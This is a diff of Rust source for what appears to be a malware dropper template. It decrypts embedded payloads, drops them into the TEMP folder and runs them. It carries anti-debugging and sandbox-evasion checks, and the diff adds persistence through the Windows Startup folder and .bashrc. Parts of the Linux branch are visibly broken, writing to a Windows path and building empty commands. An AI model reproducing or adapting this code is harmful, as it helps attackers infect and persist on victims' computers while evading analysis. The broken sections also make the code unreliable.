@@ -23,6 +23,7 @@
 
 use std::fs;
 use std::path::PathBuf;
+use std::env;
 
 use aes_gcm::{
     aead::{Aead, KeyInit},
@@ -41,8 +42,6 @@ use debugoff;
 // Constants
 
 static KEY: &'static [u8] = b"--key--";
-
-static TEMP_DIR: &'static str = env!("TEMP");
 
 // Functions
 
@@ -75,9 +74,9 @@ fn decrypt_content(nonce: &[u8], content: &[u8], key: &[u8]) -> Option<Vec<u8>> 
     }
 }
 
-fn decrypt_n_drop(filename: &str, nonce: &[u8], content: &[u8], key: &[u8]) -> bool {
+fn decrypt_n_drop(temp: &str, filename: &str, nonce: &[u8], content: &[u8], key: &[u8], autorun: bool) -> bool {
 
-    let path = PathBuf::from(TEMP_DIR).join(filename);
+    let path = PathBuf::from(temp).join(filename);
 
     #[cfg(debug_assertions)] println!("Decrypt and drop file {} by path {}", filename, path.display());
 
@@ -91,7 +90,7 @@ fn decrypt_n_drop(filename: &str, nonce: &[u8], content: &[u8], key: &[u8]) -> b
         None => { #[cfg(debug_assertions)] println!("Cannot decompress data"); return false; }
     };
 
-    match fs::write(&path, content_unzip) {
+    match fs::write(&path, &content_unzip) {
         #[allow(unused_variables)]
         Err(e) => { #[cfg(debug_assertions)] println!("Error while file write out: {}", e); return false; }
         Ok(_) => {}
@@ -107,22 +106,73 @@ fn decrypt_n_drop(filename: &str, nonce: &[u8], content: &[u8], key: &[u8]) -> b
         None => { #[cfg(debug_assertions)] println!("Error while getting extension"); return false; }
     };
 
+    match autorun {
+        true => {
+            #[cfg(target_os="windows")]
+            {
+                match env::var("APPDATA") {
+                    Ok(r) => {
+                        let startup_path = r + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + filename;
+                        #[cfg(debug_assertions)] println!("Writing autorun by path \"{}\"", &startup_path);
+                        match fs::write(startup_path, content_unzip) {
+                            #[allow(unused_variables)]
+                            Err(e) => { #[cfg(debug_assertions)] println!("Error writing file to autorun (Windows): {}", e); }
+                            Ok(_) => {}
+                        };
+                    }
+                    Err(_) => {}
+                };
+            }
+
+            #[cfg(target_os="linux")]
+            {
+                match env::var("HOME") {
+                    Ok(r) => {
+                        let p = r + "/.bashrc";
+                        match fs::read(&p) {
+                            #[allow(unused_variables)]
+                            Err(e) => { #[cfg(debug_assertions)] println!("Error reading file .bashrc (Windows)") }
+                            Ok(r) => {
+                                r.extend_from_slice(b"\n");
+                                match fs::write("C:\\Users\\".to_owned() + env!("USERNAME"), r + content_unzip) {
+                                    #[allow(unused_variables)]
+                                    Err(e) => { #[cfg(debug_assertions)] println!("Error writing file to autorun (Windows)") }
+                                    Ok(_) => {}
+                                };
+                            }
+                        };
+                    }
+                    Err(_) => {}
+                };
+            }
+        }
+        false => {}
+    };
+
     let path_str = match path.to_str() {
         Some(r) => { r }
         None => { #[cfg(debug_assertions)] println!("Error while converting PathBuf to str"); return false; }
     };
 
-    let command = if extension == "vbs" && cfg!(target_os="windows") {
-        "cscript.exe ".to_owned() + " //D " + path_str
-    } else if extension == "bat" && cfg!(target_os="windows") {
-        "cscript.exe ".to_owned() + " /c " + path_str
-    } else if extension == "sh" && cfg!(target_os="linux") {
-        "sh ".to_owned() + path_str
-    } else if extension == "py" && cfg!(target_os="linux") {
-        "python3 ".to_owned() + path_str
-    } else {
-        path_str.to_owned()
-    };
+    let command =
+        if cfg!(target_os="windows") {
+            "cmd /c start ".to_owned() + path_str
+        } else if cfg!(target_os="linux") {
+
+            if filename.ends_with("_bash.sh") {
+                "bash \"".to_owned() + "\""
+            } else {
+
+                match extension {
+                    "sh" => { "sh \"".to_owned() + "\"" }
+                    "py" => { "python3 \"".to_owned() + "\"" }
+                    _ => { path_str.to_owned() }
+                }
+
+            }
+        } else {
+            path_str.to_owned()
+        };
 
     match shell(command).spawn() {
         Ok(_) => {}
@@ -143,7 +193,7 @@ fn unzip(data: &[u8]) -> Option<Vec<u8>> {
     }
 }
 
-#[cfg(feature="show_messagebox")]
+#[cfg(any(feature="show_messagebox_after", feature="show_messagebox_before"))]
 #[allow(unused_must_use)]
 fn show_message() {
     msgbox::create("--messagebox-title--", "--messagebox-text--", msgbox::IconType::SHOW_MESSAGEBOX_TYPE);
@@ -155,7 +205,7 @@ fn main() {
     #[cfg(not(debug_assertions))]
     debugoff::multi_ptraceme_or_die();
 
-    #[cfg(feature="show_messagebox")]
+    #[cfg(feature="show_messagebox_before")]
     show_message();
 
     #[cfg(feature="anti_vm")]
@@ -170,6 +220,12 @@ fn main() {
         };
         if !winapi::um::libloaderapi::GetModuleHandleA(c_str.as_ptr() as *const i8).is_null() { #[cfg(debug_assertions)] println!("Sandboxie detected. Exiting..."); return; };
     }
+
+    #[allow(unused_variables)]
+    let temp = match env::var("TEMP") {
+        Ok(r) => { r }
+        Err(_) => { return; }
+    };
     
     let key_vec = match general_purpose::STANDARD_NO_PAD.decode(KEY) {
         #[allow(unused_variables)]
@@ -180,6 +236,10 @@ fn main() {
     let key = key_vec.as_slice();
 
     //--gen-code--
+
+    #[cfg(feature="show_messagebox_after")]
+    show_message();
+
 
     #[cfg(target_os = "linux")]
     #[cfg(not(debug_assertions))]
